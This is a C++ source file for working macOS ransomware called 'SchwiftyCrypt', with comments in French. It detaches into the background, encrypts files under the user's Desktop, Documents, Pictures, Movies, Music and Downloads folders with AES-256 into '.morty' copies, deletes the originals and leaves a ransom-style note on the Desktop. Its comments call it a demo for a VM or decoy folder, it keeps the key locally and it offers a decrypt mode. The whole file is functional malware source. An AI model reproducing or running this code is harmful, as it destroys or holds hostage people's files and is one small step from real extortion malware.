// language: C++17, file: src/macos/03_ransomware_mac.cpp, target: macOS, clang
// SchwiftyCrypt macOS - AES-256-CBC via CommonCrypto, .morty, mode decrypt inclus
// Usage: (sans arg) chiffrer | decrypt : dechiffrer avec la cle sauvegardee
// Build: clang++ -O2 -std=c++17
// TEST EN VM / REPERTOIRE LEURRE - il chiffre vraiment.
#include <CommonCrypto/CommonCryptor.h>
#include <sys/stat.h>
#include <dirent.h>
#include <pwd.h>
#include <unistd.h>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>

static const size_t kMaxFile = 128 * 1024 * 1024;

static std::string Home() { return getpwuid(getuid())->pw_dir; }

static bool Crypt(const unsigned char* key, const unsigned char* iv, unsigned char* data,
                  size_t len, std::vector<unsigned char>& out, bool encrypt) {
    size_t bufSz = len + 16;
    out.resize(bufSz);
    size_t moved = 0;
    CCCryptorStatus st = CCCrypt(
        encrypt ? kCCEncrypt : kCCDecrypt,
        kCCAlgorithmAES, kCCOptionPKCS7Padding,
        key, kCCKeySizeAES256, iv,
        data, len, out.data(), bufSz, &moved);
    if (st != kCCSuccess) return false;
    out.resize(moved);
    return true;
}

static void ReadAll(const std::string& p, std::vector<unsigned char>& d) {
    FILE* f = fopen(p.c_str(), "rb");
    if (!f) return;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz > 0 && (size_t)sz <= kMaxFile) {
        d.resize(sz);
        fread(d.data(), 1, sz, f);
    }
    fclose(f);
}

static void WriteAll(const std::string& p, const std::vector<unsigned char>& d) {
    FILE* f = fopen(p.c_str(), "wb");
    if (!f) return;
    fwrite(d.data(), 1, d.size(), f);
    fclose(f);
}

static void Walk(const std::string& dir, unsigned char* key, unsigned char* iv, bool decrypt, int depth) {
    if (depth > 3) return;
    DIR* d = opendir(dir.c_str());
    if (!d) return;
    dirent* e;
    while ((e = readdir(d))) {
        std::string name = e->d_name;
        if (name == "." || name == ".." || name[0] == '.') continue;
        std::string full = dir + "/" + name;
        struct stat st{};
        if (stat(full.c_str(), &st) != 0) continue;
        if (S_ISDIR(st.st_mode)) { Walk(full, key, iv, decrypt, depth + 1); continue; }
        bool isMorty = name.size() > 6 && name.substr(name.size() - 6) == ".morty";
        if (decrypt != isMorty) continue;
        if (!decrypt && (name.size() > 4 &&
            (name.substr(name.size() - 4) == ".app" || name.substr(name.size() - 4) == ".dylib"))) continue;

        std::vector<unsigned char> in;
        ReadAll(full, in);
        if (in.empty()) continue;
        std::vector<unsigned char> out;
        if (Crypt(key, iv, in.data(), in.size(), out, !decrypt)) {
            if (decrypt) {
                std::string orig = full.substr(0, full.size() - 6);
                WriteAll(orig, out);
                ::remove(full.c_str());
            } else {
                WriteAll(full + ".morty", out);
                ::remove(full.c_str());
            }
        }
    }
    closedir(d);
}

int main(int argc, char** argv) {
    daemon(0, 0);
    bool decrypt = (argc > 1 && strcmp(argv[1], "decrypt") == 0);
    std::string home = Home();

    unsigned char blob[48];
    std::string keyPath = home + "/.rick_key.bin";
    if (decrypt) {
        FILE* f = fopen(keyPath.c_str(), "rb");
        if (!f) return 2;
        fread(blob, 1, 48, f);
        fclose(f);
    } else {
        FILE* u = fopen("/dev/urandom", "rb");
        if (!u) return 3;
        fread(blob, 1, 48, u);
        fclose(u);
        FILE* f = fopen(keyPath.c_str(), "wb");
        if (f) { fwrite(blob, 1, 48, f); fclose(f); chmod(keyPath.c_str(), 0600); }
    }

    std::vector<std::string> roots = {
        home + "/Desktop", home + "/Documents", home + "/Pictures",
        home + "/Movies",  home + "/Music",    home + "/Downloads"
    };
    for (const auto& r : roots) Walk(r, blob, blob + 32, decrypt, 0);


    if (!decrypt) {
        FILE* f = fopen((home + "/Desktop/README_RICK.txt").c_str(), "w");
        if (f) {
            fprintf(f,
                "GET SCHWIFTY, MORTY.\n\n"
                "Fichiers chiffres en AES-256-CBC (extension .morty).\n"
                "Cle : ~/.rick_key.bin (version demo).\n"
                "Relance avec 'decrypt' pour restaurer.\n");
            fclose(f);
        }
    }
    return 0;
}
